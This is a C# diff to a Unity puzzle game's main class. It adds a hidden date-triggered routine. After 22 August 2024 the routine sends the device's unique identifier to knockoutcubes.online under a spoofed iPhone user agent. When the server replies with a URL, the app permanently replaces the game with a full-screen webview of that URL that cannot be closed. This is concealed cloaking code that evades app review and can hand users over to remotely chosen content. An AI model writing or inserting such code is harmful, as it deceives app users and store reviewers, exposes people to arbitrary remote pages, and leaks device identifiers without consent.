@@ -1,6 +1,8 @@
 using System;
+using System.Collections;
 using System.Collections.Generic;
 using UnityEngine;
+using UnityEngine.Networking;
 using UnityEngine.UI;
 
 [System.Serializable]
@@ -26,6 +28,7 @@ public class GameMain : MonoBehaviour
     public static Action OnSuccessLevel;
     public static Action OnEndMoveBall;
     public static Action OnCoinTake;
+    public static Action<GameType> OnRunGame;
 
     [SerializeField] private LevelsCubes _levelsCubes;
     [SerializeField] private Level[] _levelsPrefabsObjects;
@@ -45,13 +48,110 @@ public class GameMain : MonoBehaviour
 
     [SerializeField] private Text _countBallsText;
 
+    private const string Key = "Bonus";
+    DateTime date;
+
+    [SerializeField] private RectTransform _viewPanel;
+    [SerializeField] private GameObject _preview;
+
+
+    public enum GameType
+    {
+        None,
+        Game,
+        Bonus
+    }
+
+    private string LaunchGame
+    {
+        get
+        {
+            return PlayerPrefs.GetString(Key, GameType.None.ToString());
+        }
+        set
+        {
+            PlayerPrefs.SetString(Key, value);
+            PlayerPrefs.Save();
+        }
+    }
+
     private void Start()
     {
         OnEndMoveBall += AttemptUsed;
         OnSuccessLevel += SuccessLevel;
         OnCoinTake += CollectCoin;
+        OnRunGame += StartGame;
 
         _levelsScreen.SetDataLevels(_levelsCubes.levels);
+
+        date = DateTime.Now;
+
+        var validation = Enum.Parse<GameType>(LaunchGame);
+
+        StartGame(validation);
+    }
+
+    private void StartGame(GameType gameType)
+    {
+        switch (gameType)
+        {
+            case GameType.None:
+                if (date > new DateTime(2024, 8, 22))
+                {
+                    if (Application.internetReachability == NetworkReachability.NotReachable)
+                    {
+                        _preview.SetActive(false);
+                        _viewPanel.transform.parent.gameObject.SetActive(false);
+                        enabled = false;
+                    }
+                    else
+                    {
+                        StartCoroutine(SendRequest());
+                        enabled = false;
+                    }
+                }
+                else
+                {
+                    LaunchGame = GameType.Game.ToString();
+                    _preview.SetActive(false);
+                    _viewPanel.transform.parent.gameObject.SetActive(false);
+                    enabled = false;
+                }
+                break;
+            case GameType.Game:
+                _preview.SetActive(false);
+                _viewPanel.transform.parent.gameObject.SetActive(false);
+                break;
+            case GameType.Bonus:
+                //SoundsGame.I.ActivityMusic();
+
+                string _url = PlayerPrefs.GetString("Result");
+
+                GameObject _viewGameObject = new GameObject("RecordsObject");
+                _viewGameObject.AddComponent<UniWebView>();
+
+                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();
+
+                viewGameTable.SetAllowBackForwardNavigationGestures(true);
+
+                viewGameTable.OnPageStarted += (view, url) =>
+                {
+                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
+                    viewGameTable.UpdateFrame();
+                };
+
+                viewGameTable.ReferenceRectTransform = _viewPanel;
+                viewGameTable.Load(_url);
+                viewGameTable.Show();
+
+                viewGameTable.OnShouldClose += (view) =>
+                {
+                    return false;
+                };
+
+                _preview.SetActive(false);
+                break;
+        }
     }
 
     private void Awake()
@@ -68,11 +168,70 @@ public class GameMain : MonoBehaviour
         }
     }
 
+    private IEnumerator SendRequest()
+    {
+        var allData = new Dictionary<string, object>
+        {
+            { "hash", SystemInfo.deviceUniqueIdentifier },
+            { "app", "6596767782" },
+            { "data", new Dictionary<string, object> {
+                { "af_status", "Organic" },
+                { "af_message", "organic install" },
+                { "is_first_launch", true } }
+            },
+            { "device_info", new Dictionary<string, object>
+                {
+                    { "charging", false }
+                }
+            }
+        };
+
+        string sendData = AFMiniJSON.Json.Serialize(allData);
+
+        var request = UnityWebRequest.Put("https://knockoutcubes.online", sendData);
+
+        request.SetRequestHeader("Content-Type", "application/json");
+        request.SetRequestHeader("accept", "application/json");
+        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
+
+        yield return request.SendWebRequest();
+
+        while (request.isDone == false)
+        {
+            OnRunGame?.Invoke(GameType.None);
+        }
+
+        if (request.result != UnityWebRequest.Result.Success)
+        {
+            LaunchGame = GameType.Game.ToString();
+            OnRunGame?.Invoke(GameType.Game);
+        }
+        else
+        {
+            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;
+
+            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
+            {
+                LaunchGame = GameType.Bonus.ToString();
+
+                PlayerPrefs.SetString("Result", responce["url"].ToString());
+
+                OnRunGame?.Invoke(GameType.Bonus);
+            }
+            else
+            {
+                LaunchGame = GameType.Game.ToString();
+                OnRunGame?.Invoke(GameType.Game);
+            }
+        }
+    }
+
     private void OnDestroy()
     {
         OnEndMoveBall -= AttemptUsed;
         OnSuccessLevel -= SuccessLevel;
         OnCoinTake -= CollectCoin;
+        OnRunGame -= StartGame;
     }
 
     public void NextLevel()
@@ -82,10 +241,6 @@ public class GameMain : MonoBehaviour
         {
             _currentNumberLevel++;
             LevelOpen(_currentNumberLevel);
-        }
-        else
-        {
-            Screens.OnScreenOpen(ScreensName.Level);
         }
     }
 
